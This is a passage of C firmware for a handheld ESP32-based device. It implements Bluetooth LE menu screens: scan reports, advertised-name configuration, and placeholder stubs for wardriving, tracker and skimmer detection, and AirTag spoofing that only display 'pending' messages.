        {
            xQueueReceive(button_events_q_hdl, &btn, 0);
            if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
            {
                m1_esp32_simple_cmd(CMD_BLE_ADV_STOP, &resp, BLE_CMD_TIMEOUT_MS);
                xQueueReset(main_q_hdl);
                break;
            }
        }
    }
}

void ble_sniff_analyzer(void)
{
    ble_raw_scan_report("BT ANALYZER", BLE_RAW_ANALYZER);
}

void ble_sniff_generic(void)
{
    bluetooth_scan();
}

void ble_sniff_flipper(void)
{
    ble_raw_scan_report("FLIPPER SNIFF", BLE_RAW_FLIPPER);
}

void ble_sniff_airtag(void)
{
    ble_raw_scan_report("AIRTAG SNIFF", BLE_RAW_AIRTAG);
}

void ble_monitor_airtag(void)
{
    ble_show_pending("AIRTAG MONITOR", "Continuous scan mode", "ESP32 cmd next");
}

void ble_wardrive(void)
{
    ble_show_pending("BLE WARDRIVE", "Needs SD logging", "and raw adv fields");
}

void ble_wardrive_continuous(void)
{
    ble_show_pending("BLE WARD CONT", "Needs background scan", "and SD logging");
}

void ble_detect_skimmers(void)
{
    ble_show_pending("SKIMMER DETECT", "Needs adv pattern DB", "ESP32 cmd next");
}

void ble_detect_flock(void)
{
    ble_show_pending("FLOCK DETECT", "Needs signature set", "ESP32 cmd next");
}

void ble_sniff_flock(void)
{
    ble_show_pending("FLOCK SNIFF", "Needs signature set", "ESP32 cmd next");
}

void ble_wardrive_flock(void)
{
    ble_show_pending("FLOCK WDRIVE", "Needs SD logging", "ESP32 cmd next");
}

void ble_detect_meta(void)
{
    ble_show_pending("META DETECT", "Needs mfg data match", "ESP32 cmd next");
}

void ble_spoof_airtag(void)
{
    ble_show_pending("SPOOF AIRTAG", "Needs Find My payload", "not raw name adv");
}


/*============================================================================*/
/**
  * @brief BLE config placeholder
  */
/*============================================================================*/
void bluetooth_config(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;
    char new_name[BLE_ADV_NAME_MAX + 1];
    bool redraw = true;

    ble_adv_name_load();

    while (1)
    {
        if (redraw)
        {
            redraw = false;
            m1_u8g2_firstpage();
            u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
            u8g2_DrawStr(&m1_u8g2, 2, 10, "BT CONFIG");
            u8g2_DrawHLine(&m1_u8g2, 0, 12, M1_LCD_DISPLAY_WIDTH);

            u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
            u8g2_DrawStr(&m1_u8g2, 2, 26, "Adv Name:");
            u8g2_DrawStr(&m1_u8g2, 2, 38, ble_adv_name);
            m1_draw_bottom_bar(&m1_u8g2, NULL, "Edit", NULL, NULL);
            m1_u8g2_nextpage();
        }

        ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
        if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;

        xQueueReceive(button_events_q_hdl, &btn, 0);
        if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
        {
            xQueueReset(main_q_hdl);
            break;
        }
        else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
        {
            memset(new_name, 0, sizeof(new_name));
            if (m1_vkb_get_text("BLE adv name:", ble_adv_name, new_name, BLE_ADV_NAME_MAX) > 0)
            {
                ble_adv_name_set(new_name);
                ble_adv_name_save();
            }
            redraw = true;
        }
    }
}

/*==========================================================================*/
/* Legacy AT-layer stubs — remain compilable for m1_bt_scene.c callers      */
/* while AT firmware is not used.                                            */
/*==========================================================================*/

#ifdef M1_APP_BT_MANAGE_ENABLE
void bluetooth_saved_devices(void)
{
u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
m1_u8g2_firstpage();
u8g2_DrawStr(&m1_u8g2, 6, 15, "Saved Devices");
u8g2_DrawStr(&m1_u8g2, 6, 30, "Not available");
u8g2_DrawStr(&m1_u8g2, 6, 45, "with SiN360 FW");
m1_u8g2_nextpage();
HAL_Delay(2000);
}

void bluetooth_info(void)
{
u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
m1_u8g2_firstpage();
u8g2_DrawStr(&m1_u8g2, 6, 15, "BT Info");
u8g2_DrawStr(&m1_u8g2, 6, 30, "Use BLE Config");
m1_u8g2_nextpage();
HAL_Delay(2000);
}

bt_connection_state_t *bt_get_connection_state(void)
{
	/* SiN360 binary-SPI firmware does not support legacy AT BT management.
	 * Return a stub state that is always disconnected so the home-screen
	 * BT icon remains hidden. */
	static bt_connection_state_t state = { .connected = false };
	return &state;
}
#endif /* M1_APP_BT_MANAGE_ENABLE */

#ifdef M1_APP_BADBT_ENABLE
void bluetooth_set_badbt_name(void)
{
u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
m1_u8g2_firstpage();
u8g2_DrawStr(&m1_u8g2, 6, 15, "BT Name");
u8g2_DrawStr(&m1_u8g2, 6, 30, "Use BLE Config");
m1_u8g2_nextpage();
HAL_Delay(2000);
}
#endif /* M1_APP_BADBT_ENABLE */
